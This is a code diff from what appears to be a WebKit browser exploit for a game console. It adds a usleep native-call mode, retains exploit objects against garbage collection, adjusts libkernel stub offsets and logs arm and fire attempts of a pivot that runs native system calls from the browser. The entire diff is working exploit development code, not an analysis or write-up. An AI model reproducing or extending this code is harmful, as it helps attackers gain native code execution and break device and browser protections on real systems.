@@ -55,10 +55,12 @@ import {
     huntLibkernelCandidatesChunk,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
-import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
+import { prepNativeChain, stageGetpid, stageUsleep, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250832h";
+const BUILD_ID = "rw-20250832i";
+/** Native fire mode: usleep first (Suchi wrapper), getpid after lk confirmed */
+const NATIVE_FIRE_USLEEP = params.get("native") !== "getpid";
 /** BillZaiD fixed lk base (game process) — trial in WebKit via usleep prologue */
 const BILLZAI_LK_BASE = "80a67c000";
 const SS_HUNT_TRACE = "wk-hunt-trace";
@@ -226,11 +228,11 @@ function setUi() {
     if (btnNative) {
         btnNative.disabled = busy || !ready || !nativeAllowed;
         if (nativeStaged) {
-            btnNative.textContent = "Fire getpid";
+            btnNative.textContent = NATIVE_FIRE_USLEEP ? "Fire usleep" : "Fire getpid";
             btnNative.title = "expm1 pivot — zero alloc, one tap";
         } else {
-            btnNative.textContent = "Arm getpid";
-            btnNative.title = "Force lk auto-arms — or tap Arm, then Fire";
+            btnNative.textContent = NATIVE_FIRE_USLEEP ? "Arm usleep" : "Arm getpid";
+            btnNative.title = "Accept lk first — Arm then Fire";
         }
     }
     if (btnLoadCal) btnLoadCal.disabled = busy || !ready;
@@ -3051,11 +3053,27 @@ function ensureNativePrep(p, off) {
         mainMf, mainOrig, pivotObj, pivotCell,
     });
     nativePrep.keepAlive.push(pivotObj);
+    pinNativeRetain();
     return nativePrep;
 }
 
+function pinNativeRetain() {
+    if (!nativePrep) return;
+    retained.push(nativePrep.M.slab, nativePrep.pivotObj);
+    if (nativePrep.keepAlive) {
+        for (let i = 0; i < nativePrep.keepAlive.length; i++)
+            retained.push(nativePrep.keepAlive[i]);
+    }
+    if (window._wkCarrier && window._wkCarrier.textarea)
+        retained.push(window._wkCarrier.textarea);
+}
+
 function getpidStubAddr(lk, off) {
-    const stubOff = (off.k_stubs && off.k_stubs[SYS_GETPID]) || 0x2cb70;
+    let stubOff = off.k_getpid_syscall;
+    if (stubOff == null && off.k_stubs && off.k_stubs[SYS_GETPID] != null)
+        stubOff = off.k_stubs[SYS_GETPID];
+    if (stubOff == null)
+        stubOff = 0x4fa;
     return { stub: lk.add32(stubOff), stubOff };
 }
 
@@ -3126,10 +3144,16 @@ function runArmGetpid() {
     nativeQuiet = true;
     try {
         if (!nativePrep) ensureNativePrep(p, off);
-        stageGetpid(p, nativePrep, lk, off);
+        if (NATIVE_FIRE_USLEEP) {
+            stageUsleep(p, nativePrep, lk, off, 1000);
+            mark("NATIVE-ARMED", "usleep+13b20 — tap Fire (Suchi wrapper, not stub table)");
+        } else {
+            stageGetpid(p, nativePrep, lk, off);
+            const { stub, stubOff } = getpidStubAddr(lk, off);
+            mark("NATIVE-ARMED", "getpid+" + stubOff.toString(16) + " stub=" + stub);
+        }
         nativeStaged = true;
-        mark("NATIVE-ARMED", "G0 set — tap Fire getpid");
-        state("armed — Fire getpid", "warn");
+        state("armed — Fire", "warn");
         crashLog.append("NATIVE-ARMED lk=" + lk, "NATIVE-ARM");
         crashLog.flushSync();
     } catch (err) {
@@ -3153,17 +3177,17 @@ function runFireGetpid() {
     setUi();
     nativeQuiet = true;
     lkQuiet = true;
-    retained.length = 0;
-    pointers.length = 0;
-    if (outEl) outEl.textContent = "Fire getpid…";
+    pinNativeRetain();
+    if (outEl) outEl.textContent = "Fire native…";
 
     let pid = -1;
     let errMsg = null;
     const p = window.p;
     const lk = lkFromUi();
-    const { stub } = getpidStubAddr(lk, loadEffectiveOff());
+    const off = loadEffectiveOff();
+    const kind = (nativePrep && nativePrep.fireKind) || (NATIVE_FIRE_USLEEP ? "usleep" : "getpid");
     try {
-        crashLog.append("NATIVE-FIRE-RETRY stub=" + stub, "NATIVE-FIRE");
+        crashLog.append("NATIVE-FIRE " + kind + " lk=" + lk, "NATIVE-FIRE");
         crashLog.flushSync();
         pid = fireGetpid(p, nativePrep);
     } catch (err) {
@@ -3173,7 +3197,20 @@ function runFireGetpid() {
     nativeQuiet = false;
     lkQuiet = false;
     nativeStaged = false;
-    if (pid > 0) {
+    if (kind.startsWith("usleep")) {
+        if (!errMsg) {
+            mark("NATIVE-OK", kind + " returned (no OOM) build=" + BUILD_ID);
+            state("usleep OK — add ?native=getpid for getpid", "ok");
+            try {
+                if (lk) saveLibkernelSession(lk, null, { forced: true });
+                crashLog.append("NATIVE-OK " + kind, "NATIVE-OK");
+                crashLog.flushSync();
+            } catch (_) { }
+        } else {
+            mark("NATIVE-FAIL", kind + " " + errMsg + " build=" + BUILD_ID);
+            state("native fire failed", "bad");
+        }
+    } else if (pid > 0) {
         mark("NATIVE-OK", "getpid=" + pid + " build=" + BUILD_ID);
         state("getpid OK pid=" + pid, "ok");
         try {
